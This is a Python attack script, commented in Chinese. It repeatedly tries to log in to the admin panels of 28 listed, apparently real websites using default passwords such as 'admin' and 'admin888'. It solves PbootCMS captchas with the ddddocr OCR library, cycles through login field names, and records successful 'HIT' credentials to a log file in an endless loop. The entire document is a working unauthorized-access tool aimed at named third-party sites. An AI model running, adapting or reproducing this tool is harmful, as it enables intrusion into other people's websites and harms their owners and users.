#!/usr/bin/env python3
"""
任务2: ddddocr + 28个后台密码自动登录攻击
持续循环尝试所有存活目标
"""
import subprocess, ddddocr, time, random

# Scanner v7 发现的28个后台密码
TARGETS = [
    ("ajinga.com", "/login", "admin"),
    ("gzjvcom.com", "/admin", "admin888"),
    ("pmtemple.com", "/admin", "admin"),
    ("heshdity.com", "/admin", "admin"),
    ("zhangyupeng.com", "/admin", "admin"),
    ("alltuu.com", "/admin", "admin"),
    ("ehuoyan.com", "/admin.php", "123456"),
    ("chegva.com", "/admin", "admin"),
    ("listarypro.com", "/admin", "admin"),
    ("jh597.com", "/admin", "admin"),
    ("osgz.com", "/login", "osgz"),
    ("zljweb.com", "/admin", "admin888"),
    ("le890.com", "/login", "admin"),
    ("cubing.com", "/login", "admin"),
    ("itopers.com", "/admin", "admin"),
    ("imummybiz.com", "/admin", "admin"),
    ("thyuu.com", "/admin", "admin"),
    ("doxue.com", "/login", "admin"),
    ("dm0775.com", "/admin", "admin"),
    ("kfhty.com", "/admin", "admin"),
    ("geindex.com", "/login", "admin"),
    ("zhujiwiki.com", "/admin", "admin"),
    ("cninternetdownloadmanager.com", "/admin", "admin"),
    ("yurenmed.com", "/admin.php/index/login", "admin"),
    ("wxtzzn.com", "/admin.php/index/login", "admin"),
    ("ntjshj.com", "/admin.php/index/login", "admin"),
    ("choexpo.cn", "/admin.php/index/login", "admin"),
    ("bjry168.com", "/admin.php/index/login", "admin"),
]

OCR = ddddocr.DdddOcr(show_ad=False)
LOG = "/tmp/auto_login_results.txt"

def log(msg):
    t = time.strftime("%H:%M:%S")
    line = f"[{t}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f: f.write(line + "\n")

def curl(url, cookie, data=None, output=None):
    cmd = ["curl", "-sk", "--connect-timeout", "5", "--max-time", "10",
           "-b", cookie, "-c", cookie]
    if data: cmd += ["-X", "POST", "-d", data]
    if output: cmd += ["-o", output]
    else: cmd += ["-o", "/dev/null"]
    cmd += ["-D", "/tmp/al_hdr.txt"]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
        with open("/tmp/al_hdr.txt") as f: hdrs = f.read()
        return hdrs
    except:
        return ""

def try_pboot_login(domain, user, pwd):
    """PbootCMS captcha login"""
    base = "http://" + domain
    ck = "/tmp/al_" + domain.replace(".", "_") + ".txt"
    
    # Get captcha
    subprocess.run(["rm", "-f", ck])
    curl(base + "/", ck)
    curl(base + "/core/code.php", ck, output="/tmp/al_cap.png")
    
    try:
        with open("/tmp/al_cap.png", "rb") as f:
            data = f.read()
        if len(data) < 100: return False
        code = OCR.classification(data).strip()
    except:
        return False
    
    # Login
    hdrs = curl(base + "/admin.php/index/login", ck,
                data=f"username={user}&password={pwd}&checkcode={code}")
    for line in hdrs.split("\n"):
        if "location:" in line.lower() and ("index/index" in line or "index/home" in line):
            return True
    return False

def try_simple_login(domain, path, user, pwd):
    """无验证码登录"""
    base = "http://" + domain
    url = base + path
    ck = "/tmp/al2_" + domain.replace(".", "_") + ".txt"
    subprocess.run(["rm", "-f", ck])
    
    # Try different login param names
    for uname in ["username", "loginname", "user", "name", "admin"]:
        for upass in ["password", "loginpwd", "pwd", "pass", "passwd"]:
            hdrs = curl(url, ck, data=f"{uname}={user}&{upass}={pwd}")
            for line in hdrs.split("\n"):
                loc = line.lower()
                if "location:" in loc and "login" not in loc and "/" in loc:
                    if any(kw in loc for kw in ["index", "home", "main", "dashboard", "admin"]):
                        return True
            time.sleep(0.3)
    return False

def check_alive(domain):
    r = subprocess.run(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
                        "--connect-timeout", "5", "http://" + domain + "/"],
                       capture_output=True, text=True)
    return r.stdout.strip() != "000"

# Main loop
log("=" * 50)
log("AUTO LOGIN ATTACK START")
log("=" * 50)

hits = 0
round_num = 0

while True:
    round_num += 1
    log(f"\n--- Round {round_num} ---")
    
    for domain, path, pwd in TARGETS:
        if not check_alive(domain):
            continue
        
        # Try without captcha first
        if try_simple_login(domain, path, "admin", pwd):
            log(f"[!] HIT (no captcha): {domain} {path} admin:{pwd}")
            hits += 1
        
        # Try with captcha for PbootCMS targets
        if "yurenmed" in domain or "wxtzzn" in domain or "ntjshj" in domain or \
           "choexpo" in domain or "bjry168" in domain:
            if try_pboot_login(domain, "admin", pwd):
                log(f"[!] HIT (PbootCMS): {domain} admin:{pwd}")
                hits += 1
        
        time.sleep(0.5)
    
    log(f"Round {round_num} done. Total hits: {hits}")
    log(f"Sleeping 60s before next round...")
    time.sleep(60)
